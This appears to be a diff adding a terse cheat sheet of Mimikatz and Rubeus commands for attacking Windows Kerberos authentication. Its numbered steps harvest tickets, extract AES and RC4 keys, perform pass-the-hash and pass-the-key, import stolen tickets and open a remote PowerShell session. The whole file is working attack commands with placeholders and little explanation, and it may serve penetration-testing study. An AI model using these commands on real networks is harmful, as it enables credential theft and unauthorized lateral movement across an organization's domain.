@@ -1,0 +1,21 @@
+Mimikatz / Rubeus
+
+1. harvest all tickets(need admin), automatically save all .kirbi files: 
+    -mimikatz.exe privilege::debug "sekurlsa::tickets /export"
+or (no admin)
+    -rubeus.exe dump /nowrap
+
+2. Extract Kerberos keys, aes256 or rc4
+    -mimikatz.exe privilege::debug "sekurlsa::ekeys"
+    -rubeus.exe triage
+
+3. PtH or Pass the Key
+    -mimikatz.exe privilege::debug "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<ntlm from sekurlsa::logonpasswords>
+    -rubeus.exe asktgt /domain:<domain> /user:<user> /aes256: <aes256 or rc4 from #2> /ptt(if import needed)
+
+4. import ticket
+    -rubeus.exe ptt ticket:<.kirbi file loc> or <.kirbi base64 content>
+    -mimikatz.exe privilege::debug "kerberos::ptt <.kirbi file loc>
+
+5. Powershell remote: if ticket of admin, remote management users group, or powershell remoting permission
+    -Enter-PSSession -ComputerName <Machine name>
